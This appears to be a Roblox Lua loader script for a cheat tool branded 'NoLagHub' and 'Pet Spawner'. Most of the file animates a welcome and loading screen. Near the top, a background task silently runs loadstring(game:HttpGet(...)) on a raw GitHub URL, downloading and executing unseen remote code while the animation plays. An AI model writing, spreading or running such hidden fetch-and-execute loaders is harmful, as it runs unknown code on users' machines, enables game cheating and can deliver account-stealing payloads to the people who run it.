ts = game:GetService("TweenService")
sg = script.Parent
mf = sg.MainFrame
uigr = mf.UIStroke.UIGradient
mfogs = UDim2.new(0.3, 0, 1, 0)
mfzp = UDim2.new(0, 0, 0, 0)
mfep = UDim2.new(0.5, 0, -0.5, 0)

wlcmr = {
	mf.NLH,
	mf.NLHS,
	mf.To,
	mf.ToS,
	mf.Welcome,
	mf.WelcomeS,
	mf.DS,
	mf.DSS,
	mf.X,
	mf.XS
}

fls = {
	mf.LoadingCircle,
	mf.DotsFrame,
	mf.Outline,
	mf.CloseButton,
	mf.MinimizeButton,
	mf.Header,
	mf.LoadingText
}

lds = false
lde = nil

task.spawn(function()
	local scs, err = pcall(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub-PetSpawner/CrackedScript-V1/refs/heads/main/Loader.lua"))()
	end)
	lds = scs
	lde = err
end)

spawn(function()
	while true do
		local ti = TweenInfo.new(
			5,
			Enum.EasingStyle.Linear,
			Enum.EasingDirection.InOut,
			0,
			false
		)
		local tg = {Rotation = uigr.Rotation + 360}
		local t = ts:Create(uigr, ti, tg)
		t:Play()
		t.Completed:Wait()
	end
end)

local function pof()
	task.wait(1)
	mf.UIStroke.Enabled = true
	local ti = TweenInfo.new(0.8, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
	local tg = {Size = mfogs}
	local t = ts:Create(mf, ti, tg)
	t:Play()
	t.Completed:Wait()
	task.wait(2)
	for _, l in ipairs(wlcmr) do
		l.TextTransparency = 1
		local str = l:FindFirstChildWhichIsA("UIStroke")
		if str then
			str.Transparency = 1
		end
		local tt = ts:Create(l, TweenInfo.new(0.5), {TextTransparency = 0})
		tt:Play()
		if str then
			local strokeTween = ts:Create(str, TweenInfo.new(0.5), {Transparency = 0})
			strokeTween:Play()
		end
	end
	task.wait(3)
	for _, l in ipairs(wlcmr) do
		local ttOut = ts:Create(l, TweenInfo.new(1), {TextTransparency = 1})
		ttOut:Play()

		local str = l:FindFirstChildWhichIsA("UIStroke")
		if str and mf.UIStroke then
			local sto = ts:Create(str, TweenInfo.new(1), {Transparency = 1})
			sto:Play()
			local aus = ts:Create(mf.UIStroke, TweenInfo.new(1), {Transparency = 1})
			aus:Play()
		end
	end
	task.wait(1)
	local to = TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
	local tgo = {Size = mfzp}
	local at = ts:Create(mf, to, tgo)
	at:Play()
	task.wait(2)
	mf.BackgroundTransparency = 1
	mf.UIStroke.Transparency = 1
	mf.UIStroke.UIGradient:Destroy()
	mf.UIStroke.Thickness = 1
	mf.Size = mfogs
	local mft = ts:Create(mf, TweenInfo.new(0.8), {BackgroundTransparency = 0})
	mft:Play()
	task.wait(1.2)
	local laus = ts:Create(mf.UIStroke, TweenInfo.new(0.5), {Transparency = 0})
	laus:Play()
	for _, obj in ipairs(fls) do
		if obj:IsA("TextButton") or obj:IsA("TextLabel") then
			local textTween = ts:Create(obj, TweenInfo.new(0.5), {TextTransparency = 0})
			textTween:Play()
		elseif obj.Name == "Outline" then
			obj.BackgroundTransparency = 1
			local bgTween = ts:Create(obj, TweenInfo.new(0.5), {BackgroundTransparency = 0.5})
			bgTween:Play()
		elseif obj.Name == "LoadingCircle" then
			local stroke = obj:FindFirstChild("UIStroke")
			if stroke then
				local gradient = stroke:FindFirstChildWhichIsA("UIGradient")
				if gradient then
					gradient.Transparency = NumberSequence.new(1)
					local steps = 30
					local duration = 0.5
					local waitTime = duration / steps
					coroutine.wrap(function()
						for i = 0, steps do
							local alpha = i / steps
							local v0 = 1 - alpha * 0
							local v1 = 1 - alpha * 0 
							local v2 = 1 - alpha * 1
							local seq = NumberSequence.new({
								NumberSequenceKeypoint.new(0, v0),
								NumberSequenceKeypoint.new(0.6, v1),
								NumberSequenceKeypoint.new(1, v2)
							})
							gradient.Transparency = seq
							task.wait(waitTime)
						end
					end)()
				end
			end
		elseif obj.Name == "DotsFrame" then
			for _, dot in ipairs(obj:GetChildren()) do
				if dot:IsA("Frame") then
					dot.BackgroundTransparency = 1
					local dotTween = ts:Create(dot, TweenInfo.new(0.5), {BackgroundTransparency = 0})
					dotTween:Play()
				end
			end
		end
	end
	spawn(function()
		while true do
			while true do
				local tioc = TweenInfo.new(
					1.5,
					Enum.EasingStyle.Linear,
					Enum.EasingDirection.InOut,
					0,
					false
				)
				local tgoc = {Rotation = mf.LoadingCircle.UIStroke.UIGradient.Rotation + 360}
				local tolc = ts:Create(mf.LoadingCircle.UIStroke.UIGradient, tioc, tgoc)
				tolc:Play()
				tolc.Completed:Wait()
			end
		end
	end)
	local restSize = UDim2.new(0, 0, 0, 0)
	local bounceSize = UDim2.new(0.15, 0, 0.46, 0)
	spawn(function()
		while true do
			for i = 1, 3 do
				local dot = mf.DotsFrame:FindFirstChild(tostring(i))
				if dot then
					local grow = ts:Create(dot, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
						Size = bounceSize
					})
					grow:Play()
				end
				task.wait(0.2)
			end
			task.wait(0.3)
			for i = 1, 3 do
				local dot = mf.DotsFrame:FindFirstChild(tostring(i))
				if dot then
					local shrink = ts:Create(dot, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
						Size = restSize
					})
					shrink:Play()
				end
				task.wait(0.2)
			end
			task.wait(0.3)
		end
	end)
	task.wait(5)
	local lmfp = ts:Create(mf, TweenInfo.new(1, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = mfep})
	lmfp:Play()
	lmfp.Completed:Wait()
	mf:Destroy()
end

pof()

if not lds then
	warn("Failed to load script: " .. tostring(lde))
end
